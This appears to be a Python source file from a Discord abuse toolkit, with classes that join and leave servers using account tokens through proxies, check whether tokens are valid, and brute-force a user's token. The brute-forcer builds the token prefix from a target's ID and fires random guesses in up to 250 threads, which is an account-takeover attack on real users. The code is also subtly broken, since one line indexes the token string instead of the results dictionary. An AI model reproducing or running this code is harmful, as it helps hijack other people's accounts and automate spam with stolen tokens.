from core.lib.Proxy.proxy import Proxy

class Join:
    """
    This class joins a discord group (link must be only the code)
    """
    def __init__(self,
        token: str,
        link: str,
        proxy: list = None
    ) -> None:
        self.proxy = proxy if proxy is not None else None
        self.link = link if len(link) == 8 else None
        self.token = token
        self.join()
    def join(self):
        try:
            import requests
            requestResponse = requests.post(
                "https://discordapp.com/api/v6/invite/{}".format(self.link),
                headers = {
                    'Authorization': self.token
                },
                proxies = Proxy(self.proxy) if type(self.proxy) is list else None
            )
            if 'You need to verify your account in order to perform this action.' in requestResponse.text:
                self.r = 'unverified'
            elif 'Unknown Invite' in requestResponse.text:
                self.r = 'unknown'
            elif 'expires_at' in requestResponse.text:
                self.r = 'join' 
            else:
                self.r = 'other'
        except requests.RequestException:
           self.r = 'requests.error'
        except Exception as e:
            self.r = 'error'

class Leave:
    """
    This class leave a discord group (link must be only the code)
    """
    def __init__(self,
        token: str,
        link: str,
        proxy: list = None
    ) -> None:
        self.proxy = proxy if proxy is not None else None
        self.link = link if len(link) == 8 else None
        self.token = token
        self.leave()
    def leave(self):
        try:
            import requests
            requestResponse = requests.post(
                "https://discordapp.com/api/v7/users/@me/guilds/{}".format(self.link),
                headers = {
                    'Authorization': self.token
                },
                proxies = Proxy(self.proxy) if type(self.proxy) is list else None
            )
            if 'You need to verify your account in order to perform this action.' in requestResponse.text:
                self.r = 'unverified'
            elif 'Unknown Invite' in requestResponse.text:
                self.r = 'unknown'
            elif requestResponse.status_code == 204:
                self.r = 'join' 
            else:
                self.r = 'other'
        except requests.RequestException:
           self.r = 'requests.error'
        except Exception as e:
            self.r = 'error'

class Checker:
    """
    This class checks a discord token
    """
    def __init__(self,
        token: str,
        proxy: list = None
    ) -> None:
        self.proxy = proxy if proxy is not None else None
        self.token = token
        self.check()

    def check(self):    
        try:
            import requests
            requestResponse = requests.post(
                "https://discordapp.com/api/v6/invite/pXdxXCC",
                headers = {
                    'Authorization': self.token
                },
                proxies = Proxy(self.proxy) if type(self.proxy) is list else None
            )
            if 'You need to verify your account in order to perform this action.' in requestResponse.text:
                self.r = 'unverified'
            elif 'Unauthorized' in requestResponse.text:
                self.r = 'invalid'
            elif 'Unknown Invite' in requestResponse.text:
                self.r = 'valid'
            elif 'Access denied' in requestResponse.text:
                self.r = 'denied'
            else:
                self.r = 'other'
        except requests.RequestException:
           self.r = 'requests.error'
        except Exception as e:
            self.r = 'error'   


class BruteForce:
    def __init__(self,
        identifier: str,
        proxy: list = None
        ) -> None:
        self.id = identifier
        self.proxy = proxy if proxy is not None else None
        self.start()
    def start(self):
        import base64, random
        import string, requests
        import threading
        tokens = {"list": [], "valid": None}
        def check(token):
            try:
                requestResponse = requests.get(
                    "https://discordapp.com/api/v9/auth/login",
                    headers = {
                        'Authorization': token
                    },
                    proxies = Proxy(self.proxy) if type(self.proxy) is list else None
                )
                if requestResponse.status_code == 200:
                    print(" [-] %s " % ( token, ))
                    token["valid"] = token
                else:
                    print(" [-] %s " % ( token, ))
                    tokens["list"].append(token)
            except:
                threading.Thread(target=check, args=(token,)).start()
        self.id = str(base64.b64encode((self.id).encode("ascii")))[2:-1]
        while True:
            token = self.id + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=4)) + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=25))
            if threading.active_count() < 250 and tokens["valid"] is None:
                threading.Thread(target=check, args=(token,)).start()


